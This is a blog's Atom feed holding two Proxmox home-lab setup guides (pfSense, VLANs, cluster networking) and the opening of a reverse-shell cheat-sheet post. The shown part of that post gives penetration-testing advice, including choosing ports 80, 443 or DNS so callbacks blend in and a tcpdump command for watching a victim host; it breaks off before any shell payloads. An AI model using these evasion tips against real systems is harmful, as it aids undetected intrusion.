<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-02-22T22:49:55-06:00</updated><id>http://localhost:4000/</id><title type="html">Notepad+++  - </title><subtitle>Putting stuff together so you don't have to google as hard as I did.
</subtitle><entry><title type="html">Proxmox Home Lab on a Slightly Larger Budget - Part 2</title><link href="http://localhost:4000/2018/02/19/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part2.html" rel="alternate" type="text/html" title="Proxmox Home Lab on a Slightly Larger Budget - Part 2" /><published>2018-02-19T00:31:00-06:00</published><updated>2018-02-19T00:31:00-06:00</updated><id>http://localhost:4000/2018/02/19/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part2</id><content type="html" xml:base="http://localhost:4000/2018/02/19/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part2.html">&lt;p&gt;Building a home lab Part 2 - Networking Some More&lt;/p&gt;

&lt;p&gt;So now we have some hardware and some virtualization hosts set up. Now you can set up your firewall. There are a few things we can do to make this environment easier to maintain. There are lots of great guides on setting up PfSense, mine will blaze through that set up to get to the goods. If you want a really great guide on setting up Pfsense, I recommend &lt;a href=&quot;https://leanpub.com/avatar&quot;&gt;Building Virtual Machine Labs&lt;/a&gt; by Tony Robinson.&lt;/p&gt;

&lt;p&gt;The real short version of it is you need to get pfsense from &lt;a href=&quot;https://www.pfsense.org/download/&quot;&gt;here&lt;/a&gt; and upload it to your lab, create a VM, load the pfesnse ISO, enable VirtIO driver support, and then configure the WAN interface before you can get to any fun stuff.&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-vms&quot;&gt;Setting up the VMs&lt;/h2&gt;

&lt;p&gt;To upload the iso, go Storage View &amp;gt; Select either node (since we configured them both to mount the NAS, it doesn’t matter which one) &amp;gt; Content &amp;gt; Upload.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/iso.png&quot; alt=&quot;Uploading an Image&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go back to Server View and click Create VM at the top right. Name it something reasonable (pfsense1 anyone?), set the storage option to “Use CD/DVD disc image file (iso)” and select your nas and the ISO image you just uploaded.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/osoption.png&quot; alt=&quot;OS Options&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Your OS options should be fine as-is, and then I used 1 socket, 2 cores, and 2048MB of RAM, which is probably overkill. Enable memory ballooning as we’ll add the drivers to support it later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/pfsensehdd.png&quot; alt=&quot;PfSense Drive Settings&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For the first network device, we’re going to bridge this onto your lan. This means your home lab PfSense router will face your network, but everything else will be NATed behind it. Attach this device to vmbr0 and set the Model to VirtIO (paravirtualized).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/pfvmbr0.png&quot; alt=&quot;PfSense Network Settings&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Note the MAC address that is generated for this interface. If you want it to come up on a predictable IP, configure this mac address as a static assignment just like you did for the ProxMox hosts.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/pfdone.png&quot; alt=&quot;PfSense Done&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before you start the VM, select it and edit the hardware. Add another network device, but this time attach it to vmbr1 and again set it to VirtIO.&lt;/p&gt;

&lt;p&gt;Start the VM and hope for the best. It should boot and let you install pfsense, I just used all defaults the whole way. When the install is wrapping up, it asks you if you want to drop into a console to make any edits. Select yes and do this edit /boot/loader.conf&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;virtio_load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YES&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;virtio_pci_load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YES&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;if_vtnet_load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YES&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;virtio_balloon_load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YES&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;virtio_blk_load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YES&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Save the file, reboot, and you have pfsense installed! It’ll boot and then you can hit it through the console by clicking on the VM in ProxMox’s Server View, selecting the VM, and using the console to manage it. It’ll run you through some setup, again, I selected defaults and let it DHCP itself onto the network. It’ll come up wherever it wants or at the address it was staticked to earlier.&lt;/p&gt;

&lt;p&gt;During this setup, I don’t configure VLANs yet. I save those for later, I like to do it all at once in the GUI.&lt;/p&gt;

&lt;h2 id=&quot;accessing-the-admin-console&quot;&gt;Accessing the Admin Console&lt;/h2&gt;

&lt;p&gt;You won’t be able to hit the management interface with the default configurations, it’s blocked to the WAN interface. There’s documentation on setting it up &lt;a href=&quot;https://doc.pfsense.org/index.php/Remote_firewall_Administration&quot;&gt;here&lt;/a&gt; but that assumes you can hit the web admin console from the Lan. Since this is a new environment, we don’t have anything on there yet.&lt;/p&gt;

&lt;p&gt;I uploaded a Linux Mint ISO to my NAS storage and deployed a VM to the vmbr1 network, you can use any live ISO you want, you just need a browser really. Launch it as live image, don’t bother installing it, but launch the browser and you can hit the pfsense admin console at LAN gateway, probably 192.168.1.1.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/mint-live.png&quot; alt=&quot;Mint Live Config&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;configuring-pfsense&quot;&gt;Configuring PfSense&lt;/h2&gt;

&lt;p&gt;Log into the admin console, the default credentials are admin/pfsense, make sure you change that if you care. Configure your hostname and domain (match your router’s domain, don’t choose anything.local if you have any macs because .local messes with their network auto configuration).&lt;/p&gt;

&lt;p&gt;I set my primary DNS to my router and secondary to Google. Static the WAN interface to an IP you want it to be on if you haven’t already or leave it DHCP. On Step 4 of 9, disable the Block RFC1918 Private Networks option. You can do the rest, now follow the recommendations from pfsense.org earlier to enable remote admin. Your firewall rule should look like the top rule (the others come in later) this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/wantopfsense.png&quot; alt=&quot;WAN to PFsense&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;NOW you should be able to manage the console through the WAN interface over HTTPS and you can throw away this VM. Don’t do this if it’s ever put on the internet or you stop trusting your network.&lt;/p&gt;

&lt;p&gt;Since we have this on our LAN, we’ll need to go to Interfaces &amp;gt; WAN &amp;gt; Reserved Networks and disable the checkbox that Blocks networks and loopback addresses.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/rfc1918.png&quot; alt=&quot;WAN rfc1918&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We’ll also need to poke this hole in the firewall to allow you to manage the firewall directly.&lt;/p&gt;

&lt;p&gt;One handy change I made was under General &amp;gt; Setup &amp;gt; WebConfigurator, I changed Top Navigation to “Fixed” because it prevents the top menu bar from getting lost when the browser isn’t full screened. Following the recommendations &lt;a href=&quot;https://doc.pfsense.org/index.php/Virtualizing_pfSense_on_Proxmox&quot;&gt;here&lt;/a&gt;, disable hardware checksum offloading.&lt;/p&gt;

&lt;h2 id=&quot;vlans&quot;&gt;VLANs&lt;/h2&gt;

&lt;p&gt;So here’s where you build whatever your heart desires. With my network, I wanted to represent an environment following “alright practices” - not the best, not the worst. I have a LAN services network, an “office/admin” network, development network that includes “external” and “internal” services like web servers and databases, a Production Internal, Production External, and an “Internet” network where attackers will come from. This is a rough map of what I built:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/logicalnetwork.png&quot; alt=&quot;Logical Network&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Change what you want about that, but if you want to build just that, you need to go to Interfaces &amp;gt; VLANs and build this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/vlan-ints.png&quot; alt=&quot;Vlan interfaces&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you’ve created the VLANs, you’ll need to assign them to an interface under Interface &amp;gt; Assignments. Each of the interfaces is all getting assigned to vtnet1 like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/int-assign.png&quot; alt=&quot;Interface Assignment&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now you need to go to Services &amp;gt; DHCP Server and configure each of the interfaces like I configured my admin interface. I recommend you use /24’s for each of the interface, it makes a lot of what we’ll do with ansible much easier (I learned this the hard way).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/adminlan.png&quot; alt=&quot;Admin DHCP&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;firewalls&quot;&gt;Firewalls!&lt;/h2&gt;

&lt;p&gt;Whew. We’re almost done. Our firewall rules are going to provide two rules at least, one that allows all traffic from the Admin network into the network and allows all traffic out. This isn’t best practice, but it’s something very simple to start with for every network that you can tune and tighten as you finish up your lab. Go to Firewall &amp;gt; Rules  and configure rules that look like this for each non-WAN interface:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/devfw.png&quot; alt=&quot;Dev Firewall&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For my “internet” VLAN, I allow all traffic in and out because it’s supposed to simulate the internet.&lt;/p&gt;

&lt;h2 id=&quot;wrapping-up&quot;&gt;Wrapping up&lt;/h2&gt;

&lt;p&gt;If you followed these steps, you should have a very basic network built. You can drop devices anywhere you want to and they should work. VLANs keep the traffic separate and firewall rules let stuff talk to each other. If you’re still with me, congrats. The next post will build some infrastructure you’ll use to deploy the rest of your images and start messing with ansible. Thanks for reading.&lt;/p&gt;</content><author><name></name></author><summary type="html">Building a home lab Part 2 - Networking Some More</summary></entry><entry><title type="html">Proxmox Home Lab on a Slightly Larger Budget - Part 1</title><link href="http://localhost:4000/2018/01/18/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part1.html" rel="alternate" type="text/html" title="Proxmox Home Lab on a Slightly Larger Budget - Part 1" /><published>2018-01-18T21:31:00-06:00</published><updated>2018-01-18T21:31:00-06:00</updated><id>http://localhost:4000/2018/01/18/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part1</id><content type="html" xml:base="http://localhost:4000/2018/01/18/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part1.html">&lt;p&gt;Proxmox is an open source virtualization solution and a really flexible base for a home lab. This guide will walk through building a simple 2 node proxmox cluster. My deployment tools are ansible and various things built into Proxmox. This guide walks through a lot of the prep work you need to do before you even install Proxmox. I recommend you follow along and get your hardware in order, plan your networking, configure your router, and then connect everything up before you start installing Proxmox.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/lab.jpg&quot; alt=&quot;My home lab&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;hardware&quot;&gt;Hardware&lt;/h3&gt;

&lt;p&gt;Proxmox is based on a fairly recent version of Debian so it’s extremely forgiving in what it’ll let you install it on. My lab consists of the following hardware:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2x thinkcentre m92p tiny’s w/ i5’s and 8gb&lt;/li&gt;
  &lt;li&gt;2x extra usb3 gig-ethernet dongles (trendnet and amazon basics, both worked fine)&lt;/li&gt;
  &lt;li&gt;1x tp-link TL-SG108E 8 port gigabit switch&lt;/li&gt;
  &lt;li&gt;1x dd-wrt router -&amp;gt; cable modem (my home router)&lt;/li&gt;
  &lt;li&gt;1x 87 key Aukey Mechanical keyboard (nice to have, not needed)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you don’t have hardware yet, watch ebay for a while and be patient. The systems I got at 140 bucks a piece were anywhere from 125 to 450 depending on when I looked. I’m pretty sure they were office worker workstations that served their two years of service and got replaced. Of course, you can also just install this on any two boxes you have laying around. You could also go real fancy and get Intel NUCs, but I managed to keep this full lab price around 450, even with the SSD’s.&lt;/p&gt;

&lt;h3 id=&quot;performance-and-compatibility-considerations&quot;&gt;Performance and Compatibility Considerations&lt;/h3&gt;

&lt;p&gt;The big performance limiter I ran into first was disk speed. Running multiple VMs or containers on the same hosts drags with a hard drive, spring for SSDs in each of your systems. I accepted all defaults in my partitioning and used single drives for everything, so I didn’t use any fancy disk formats.&lt;/p&gt;

&lt;p&gt;For networking, make sure you have Cat6 cables, a real gigabit switch, and don’t bother trying to get this stuff to work over wireless. Bridging over wireless is either impossible or too much trouble to get working for this lab’s purposes, depending on your tolerance troubleshooting that sort of thing. The time I wasted trying to figure it out was worth way more to me than the 30 dollars I ended up spending on the dongles.&lt;/p&gt;

&lt;h3 id=&quot;networking---dd-wrt&quot;&gt;Networking - DD-WRT&lt;/h3&gt;

&lt;p&gt;I use dd-wrt for my home router OS. It makes a lot of what I’m doing easier, but updated support for hardware varies. The main www.dd-wrt.com is the place to go for most questions, but the resources at &lt;a href=&quot;https://www.myopenrouter.com/&quot;&gt;my open router&lt;/a&gt; are excellent. If you don’t already have a router that supports dd-wrt, I strongly recommend you pick one based on what someone at my open router supports. Install it using their guides. For updates, go to the &lt;a href=&quot;https://download1.dd-wrt.com/dd-wrtv2/downloads/betas&quot;&gt;dd-wrt beta download site&lt;/a&gt; and avoid what’s on the &lt;a href=&quot;https://www.dd-wrt.com/site/support/router-database&quot;&gt;router database&lt;/a&gt;, beta has better bug fixes and support.&lt;/p&gt;

&lt;p&gt;Judge me if you must, but I wanted this easy to interact with from my home network, so I dumped both my home network and lab into the same subnet. I’ll break it off one day, but that’s the subject of another post.&lt;/p&gt;

&lt;p&gt;You’ll need four IP addresses available for each your hosts eno1 and eno2 interfaces. Pick them now, I’m using 10.0.0.11-12 and 10.0.0.21-22.&lt;/p&gt;

&lt;p&gt;Some stuff you also should do:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Make your home subnet a /22. You’ll appreciate the IP space.&lt;/li&gt;
  &lt;li&gt;Restrict your DHCP range to something specific, 10.0.0.50-10.0.0.150 for example.&lt;/li&gt;
  &lt;li&gt;This isn’t required but makes keeping your networks straight in your head easier
&lt;img src=&quot;http://localhost:4000/images/dhcp.png&quot; alt=&quot;dhcp&quot; class=&quot;center-image&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Configure your router name and Configure your domain name.&lt;/li&gt;
  &lt;li&gt;Enable USB Support under Services &amp;gt; USB
&lt;img src=&quot;http://localhost:4000/images/usb.png&quot; alt=&quot;usb&quot; class=&quot;center-image&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Enable NAS support. Proxmox will store images here. 
&lt;img src=&quot;http://localhost:4000/images/nas.png&quot; alt=&quot;nas&quot; class=&quot;center-image&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Create a backup of your configuration once you have something that works&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When it’s done, you’ll have the basis to build this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/netmap.png&quot; alt=&quot;netmap&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;networking---switch&quot;&gt;Networking - Switch&lt;/h3&gt;

&lt;p&gt;Configure your switch for the last IP of your network range. You’ll need to connect directly to it and static an IP if you use the same tp-link family of switches I have. I couldn’t find anything with feature parity at the same price (18 bucks on sale) but if you get something else you need VLAN support.&lt;/p&gt;

&lt;p&gt;I connected my switch to a single port on my router and used VLANs to do network segregation on the switch. With the configuration I use, everything in my lab can be accessible from my home network but we avoid switching loops and and broadcast issues. This is my vlan configuration:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/switch.png&quot; alt=&quot;vlans&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With that VLAN configuration, you’re ready to go. Connect eno1, the built in ethernet to ports 5 and 6. Port 7 and 8 will connect your dongles.&lt;/p&gt;

&lt;h3 id=&quot;installing-proxmox&quot;&gt;Installing Proxmox&lt;/h3&gt;

&lt;p&gt;Install both hosts one at a time. You’ll need a keyboard and monitor. If you don’t own two monitors for your desktop, this whole process will convince you it’s worth while. I also found it worth my while to get an additional keyboard for this. You’ll break networking every now and then if you mess with your interfaces and you’ll need to fix it and its just nice to have another keyboard and monitor to terminal in while you use the other for research or googling how tos.&lt;/p&gt;

&lt;p&gt;Use the &lt;a href=&quot;https://etcher.io/&quot;&gt;etcher&lt;/a&gt; tool to create your install disk, it’s the easiest way that works. The instructions &lt;a href=&quot;https://pve.proxmox.com/wiki/Installation&quot;&gt;here&lt;/a&gt; will do you well for your installation process.&lt;/p&gt;

&lt;p&gt;Install on the first host. I chose the hostnames pve1 and pve2. I staticked IPs predictably to make them easy to remember and work with. I accepted defaults throughout the installation process. My file system is ext4 because I only have a single disk and I used LVM, again the default.  Easy peezy, now you have two nodes with proxmox installed. They should come up after the install and reboot and be ready to go. You should be able to SSH into them with the root password from your local network.&lt;/p&gt;

&lt;h3 id=&quot;preparing-the-systems&quot;&gt;Preparing the systems&lt;/h3&gt;

&lt;p&gt;You’ll need to SSH into each host, add your SSH key if you so desire, and then do this configure the free repositories for updates and install them, unless you want to pay for support:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm /etc/apt/sources.list.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;deb http://download.proxmox.com/debian/pve stretch pve-no-subscription&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/apt/sources.list.d/pve-install-repo.list
wget http://download.proxmox.com/debian/proxmox-ve-release-5.x.gpg &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /etc/apt/trusted.gpg.d/proxmox-ve-release-5.x.gpg

apt update
apt install openvswitch-switch
apt upgrade
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Add your NAS to the /etc/fstab file of each Proxmox host. Use a credentials file for better security.This is an example of the line you’ll add to your fstab file:&lt;/p&gt;

&lt;p&gt;//mynas/media /mnt/bindmounts/media cifs rw,credentials=/home/.smbcredentials-mynas,vers=2.0,noperm,auto 0 0&lt;/p&gt;

&lt;p&gt;If you use DD-wrt and aren’t using a recent version, you’ll need to specify version 1 with “vers=1.0”. Use an updated version.&lt;/p&gt;

&lt;p&gt;Add these lines to /etc/sysctl.conf.&lt;/p&gt;

&lt;p&gt;Edit /etc/sysctl.conf to do the following (you could just as easily paste it in at the bottom):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Uncomment the next line to enable packet forwarding for IPv4&lt;/span&gt;
net.ipv4.ip_forward&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1

&lt;span class=&quot;c&quot;&gt;# disable ipv6&lt;/span&gt;
net.ipv6.conf.all.disable_ipv6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
net.ipv6.conf.default.disable_ipv6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
net.ipv6.conf.lo.disable_ipv6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1

&lt;span class=&quot;c&quot;&gt;# increase max_user_instances to allow more containers&lt;/span&gt;
fs.inotify.max_user_instances &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1024
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You’ll thank me later for this one, but you’ll notice your second network interface has some crazy name that includes the mac address in it. This long name causes all sorts of problems and is at the very least a pain to type over and over, so rename the interface eno2. You can do that by inserting the following line into /etc/udev/rules.d/10-network.rules with your proper mac address.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;SUBSYSTEM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;net&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;ACTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;add&quot;&lt;/span&gt;, ATTR&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;address&lt;span class=&quot;o&quot;&gt;}==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;XX:XX:XX:XX:XX:XX&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;eno2&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, configure your hosts file on each of the nodes to look like this, modifying it depending on what node you’re on:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@pve1:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/hosts
127.0.0.1 localhost.localdomain localhost
&amp;lt;IP pve1&amp;gt; pve1.local.lan pve1 pvelocalhost
&amp;lt;IP pve2&amp;gt; pve2.local.lan pve2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Reboot and verify your interface name and all the other changes took.&lt;/p&gt;

&lt;h3 id=&quot;configuring-your-cluster&quot;&gt;Configuring your cluster&lt;/h3&gt;

&lt;p&gt;This is so easy you’re gonna love it. Reboot first so you know all your changes took. Create your cluster and pick a name, ssh into the other host and add it. Proxmox configures ssh keys and all sorts of other services. If you want a cluster named cluster, use these steps, otherwise, customize it to your liking.&lt;/p&gt;

&lt;p&gt;The steps &lt;a href=&quot;https://pve.proxmox.com/wiki/Cluster_Manager&quot;&gt;here&lt;/a&gt; outline what needs to be done pretty well, but basically, create the cluster on pve1, ssh in pve2 and add it to the cluster. That’s really all there is to it. It does the rest. You can then launch your browser and get to the console.&lt;/p&gt;

&lt;p&gt;You can mess aroudn in in the console if you want, but you need to set up your interfaces files before you deploy any images or devices. I wouldn’t bother editing them through the GUI, there’s some options that are different to configure through the console such as mtu and anything else beyond the basics.&lt;/p&gt;

&lt;p&gt;Modify the following /etc/network/interfaces file to match the IPs for your lan for each host, back up the existing interfaces file (move it to /etc/network/interfaces.old), and drop in something that looks like this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auto lo
iface lo inet loopback

allow-vmbr0 eno1
iface eno1 inet manual
        ovs_type OVSPort
        ovs_bridge vmbr0

allow-vmbr1 eno2
iface eno2 inet manual
        ovs_type OVSPort
        ovs_bridge vmbr1
        mtu 4000

auto vmbr0
iface vmbr0 inet static
        address  10.0.0.11
        netmask  255.255.252.0
        gateway  10.0.0.1
        ovs_type OVSBridge
        ovs_ports eno1

auto vmbr1
iface vmbr1 inet static
        address  10.0.0.21
        netmask  255.255.252.0
        ovs_type OVSBridge
        ovs_ports eno2
        mtu 4000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Reboot your system here, we now we just need to make sure the NAS comes up when the network does. Create a startup script at /etc/network/if-up.d/mount and make it executable. All you need to have in it is a mount -a to get it all working. The network interface will come up, the NAS will be ready and mounted when you’re done booting up.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
mount &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now you need to enable it in the console and tell each node they want to use the NAS for storage. Log in to your console as an admin, click data center at the top left, and the click Storage and Add and pick directory 9(mine’s added already, but here’s what you’re looking for:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/storage1.png&quot; alt=&quot;storage1&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once there, enable all types of storage, set backups to two (it will come in handy later), and save. This may report as unavailable, but once you reboot and your startup script runs, it’ll mount the drive and be ready for use.&lt;/p&gt;

&lt;p&gt;Do a final reboot of your nodes. If everything went as planned, you’ve got a 2 host proxmox cluster! Congratulations.&lt;/p&gt;

&lt;p&gt;Follow up posts will go into setting up PFSense and other interesting bits in the lab. Thanks for reading.&lt;/p&gt;</content><author><name></name></author><summary type="html">Proxmox is an open source virtualization solution and a really flexible base for a home lab. This guide will walk through building a simple 2 node proxmox cluster. My deployment tools are ansible and various things built into Proxmox. This guide walks through a lot of the prep work you need to do before you even install Proxmox. I recommend you follow along and get your hardware in order, plan your networking, configure your router, and then connect everything up before you start installing Proxmox.</summary></entry><entry><title type="html">Reverse Shell Cheat Sheet</title><link href="http://localhost:4000/2017/01/17/reverse-shell-cheatsheet.html" rel="alternate" type="text/html" title="Reverse Shell Cheat Sheet" /><published>2017-01-17T20:56:00-06:00</published><updated>2017-01-17T20:56:00-06:00</updated><id>http://localhost:4000/2017/01/17/reverse-shell-cheatsheet</id><content type="html" xml:base="http://localhost:4000/2017/01/17/reverse-shell-cheatsheet.html">&lt;h2 id=&quot;cause-everyone-posts-one&quot;&gt;Cause everyone posts one&lt;/h2&gt;

&lt;p&gt;If enumeration is the bread and butter of penetration testing, reverse shells are the cheesecake. Stolen usernames and passwords may be one of the most reliable ways to get into a system, but theres nothing like messing something up a bunch and then finally seeing that reverse shell prompt pop up. These are some quick and easy ones in different formats.&lt;/p&gt;

&lt;h2 id=&quot;first-some-thoughts&quot;&gt;First, some thoughts&lt;/h2&gt;

&lt;p&gt;Reverse shells are great, but you need to make sure they get to you. Way too many reverse shells and exploits code the exploit to send reverse shells back to port 4444. If you see this port active in a production environment and can’t immediately recognize why, you need to figure it out. You may have been popped by someone who barely knows what they’re doing which probably also means someone way worse is already in.&lt;/p&gt;

&lt;p&gt;If you’re going to send yourself back a reverse shell, try ports that people should expect to see. Port 80 and 443 are great, but so is DNS. &lt;a href=&quot;http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html&quot;&gt;This&lt;/a&gt; is an excellent write up of RCE found in Facebook that had to use outbound DNS to send results back to his listening machine. Amazing stuff.&lt;/p&gt;

&lt;p&gt;If you think it should work and it’s not, tcpdump or wireshark your host (if you can) and see what’s coming and going. If I’m trying to exploit a web app on port 80 to send back a remote shell, one tcpdump quickie I use is&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump -qtpni eth0/tap0/whatever0 host &amp;lt;VICTIMIP&amp;gt; and not port 80 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That watches traffic for anything coming back and gives you a condensed, simple output for it only on the interface you expect the attack to copme back through (tap0 if you’re on a VPN, for example), listening only for the victim host so you don’t see a bunch of other noise and excluding the port you know you’re going to see traffic on. In this case, since I’m attacking port 80, I’m probably listening on port 443 with a netcat listener. You could specify port 443 only, but this wouldn’t catch if you did something wrong in your exploit and are sending the exploit back to the wrong port (we all make mistakes).&lt;/p&gt;

&lt;h3 id=&quot;but-bind-shells-are-easier&quot;&gt;But bind shells are easier!&lt;/h3&gt;

